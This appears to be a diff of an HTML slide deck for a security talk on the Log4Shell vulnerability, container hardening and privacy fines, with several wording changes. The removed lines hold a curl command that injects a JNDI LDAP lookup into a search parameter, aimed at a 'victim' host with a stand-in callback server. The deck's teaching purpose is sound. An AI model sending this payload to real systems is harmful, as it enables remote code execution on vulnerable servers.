@@ -80,9 +80,6 @@
                 <line x1="410" y1="290" x2="410" y2="325" stroke="#d33682" stroke-width="1.25" stroke-dasharray="3 3" marker-end="url(#logArrowPink)"/>
             </svg>
         </div>
-        <div class="box box-red medium" style="margin-top:0.6em;">
-            <pre><code class="language-bash">curl "http://victim:8080/api/products/search?q=\${jndi:ldap://callback:1389/pwnkit}"</code></pre>
-        </div>
     </section>
 
     <section>
@@ -94,7 +91,7 @@
             <div class="stat-tile"><span class="num">40M</span><span class="lbl">vulnerable Log4j downloads in 2025, four years later</span></div>
         </div>
         <div class="box box-red medium" style="margin-top:0.5em;">
-            <p style="margin:0.2em 0;">95% of vulnerable downloads already had a fixed version available. The fix existed; teams just didn't move.</p>
+            <p style="margin:0.2em 0;">95% of vulnerable downloads had a fix available. Teams just didn't upgrade.</p>
         </div>
     </section>
 
@@ -102,9 +99,9 @@
         <h2>What Would Have Limited the Damage?</h2>
         <ul class="icon-list">
             <li><span class="ic">🔒</span><span>No root access</span></li>
-            <li><span class="ic">🐳</span><span>No (old) Docker image</span></li>
-            <li><span class="ic">📦</span><span>No (old) OS packages like curl, wget, gcc, pkexec and runtime</span></li>
-            <li><span class="ic">📚</span><span>No (old) application dependencies</span></li>
+            <li><span class="ic">🐳</span><span>A minimal, up-to-date base image</span></li>
+            <li><span class="ic">📦</span><span>No unneeded OS tools: curl, wget, gcc, pkexec</span></li>
+            <li><span class="ic">📚</span><span>Up-to-date application dependencies</span></li>
         </ul>
     </section>
 
@@ -228,7 +225,7 @@
             <div class="stat-tile"><span class="num">&euro;15M</span><span class="lbl">or 2.5% of global turnover, whichever is higher</span></div>
         </div>
         <div class="box box-red medium" style="margin-top:0.5em;">
-            <p style="margin:0.2em 0;">Other places are moving the same way: Australia has already handed out its first multimillion-dollar fine.</p>
+            <p style="margin:0.2em 0;">🇦🇺 Australia already issued its first multimillion-dollar fine</p>
         </div>
         <aside class="notes">
             Australia: Australian Clinical Labs, 2025, first-ever penalty under the Privacy Act: $5.8M.
